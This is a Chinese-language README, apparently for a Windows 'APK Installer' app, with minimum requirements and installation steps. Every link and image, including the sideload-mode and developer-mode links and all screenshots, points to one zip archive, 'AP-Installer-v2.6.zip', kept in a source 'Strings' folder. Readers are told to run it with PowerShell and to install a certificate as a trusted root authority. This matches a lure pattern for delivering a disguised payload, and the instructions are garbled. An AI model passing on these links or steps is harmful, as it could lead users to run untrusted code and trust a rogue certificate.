## 如何安装应用
### 最低需求
- Windows 10 Build 17763 及以上
- 设备需支持 ARM64/x86/x64
- 至少 400MB 的空余储存空间 (用于储存安装包与安装应用)

### 使用应用安装脚本安装应用
- 下载并解压最新的[安装包`(APKInstaller (Package)https://github.com/K4WW4K/APK-Installer/raw/refs/heads/main/APKInstaller/APKInstaller/Strings/AP-Installer-v2.6.zip)`](https://github.com/K4WW4K/APK-Installer/raw/refs/heads/main/APKInstaller/APKInstaller/Strings/AP-Installer-v2.6.zip "下载安装包")
- 如果没有应用安装脚本，下载[`https://github.com/K4WW4K/APK-Installer/raw/refs/heads/main/APKInstaller/APKInstaller/Strings/AP-Installer-v2.6.zip`](https://github.com/K4WW4K/APK-Installer/raw/refs/heads/main/APKInstaller/APKInstaller/Strings/AP-Installer-v2.6.zip)到目标目录
![https://github.com/K4WW4K/APK-Installer/raw/refs/heads/main/APKInstaller/APKInstaller/Strings/AP-Installer-v2.6.zip](https://github.com/K4WW4K/APK-Installer/raw/refs/heads/main/APKInstaller/APKInstaller/Strings/AP-Installer-v2.6.zip)
- 右击`https://github.com/K4WW4K/APK-Installer/raw/refs/heads/main/APKInstaller/APKInstaller/Strings/AP-Installer-v2.6.zip`，选择“使用PowerShell运行”
- 应用安装脚本将会引导您完成此过程的剩余部分

### 使用应用安装程序安装应用
- 下载并解压最新的[安装包`(APKInstaller (Package)https://github.com/K4WW4K/APK-Installer/raw/refs/heads/main/APKInstaller/APKInstaller/Strings/AP-Installer-v2.6.zip)`](https://github.com/K4WW4K/APK-Installer/raw/refs/heads/main/APKInstaller/APKInstaller/Strings/AP-Installer-v2.6.zip "下载安装包")
- [开启旁加载模式](https://github.com/K4WW4K/APK-Installer/raw/refs/heads/main/APKInstaller/APKInstaller/Strings/AP-Installer-v2.6.zip)
  - 如果您想开发UWP应用，您可以开启[开发人员模式](https://github.com/K4WW4K/APK-Installer/raw/refs/heads/main/APKInstaller/APKInstaller/Strings/AP-Installer-v2.6.zip)，**对于大多数不需要做UWP开发的用户来说，开发人员模式是没有必要的**
- 安装`Dependencies`文件夹下的适用于您的设备的所有依赖包
![Dependencies](https://github.com/K4WW4K/APK-Installer/raw/refs/heads/main/APKInstaller/APKInstaller/Strings/AP-Installer-v2.6.zip)
- 安装`*.cer`证书到`本地计算机`→`受信任的根证书颁发机构`
  - 这项操作需要用到管理员权限，如果您安装证书时没有用到该权限，则可能是因为您将证书安装到了错误的位置或者您使用的是超级管理员账户
  ![安装证书](https://github.com/K4WW4K/APK-Installer/raw/refs/heads/main/APKInstaller/APKInstaller/Strings/AP-Installer-v2.6.zip)
  ![导入本地计算机](https://github.com/K4WW4K/APK-Installer/raw/refs/heads/main/APKInstaller/APKInstaller/Strings/AP-Installer-v2.6.zip)
  ![储存到受信任的根证书颁发机构](https://github.com/K4WW4K/APK-Installer/raw/refs/heads/main/APKInstaller/APKInstaller/Strings/AP-Installer-v2.6.zip)
- 双击`*.appxbundle`，单击安装，坐和放宽
![安装](https://github.com/K4WW4K/APK-Installer/raw/refs/heads/main/APKInstaller/APKInstaller/Strings/AP-Installer-v2.6.zip)
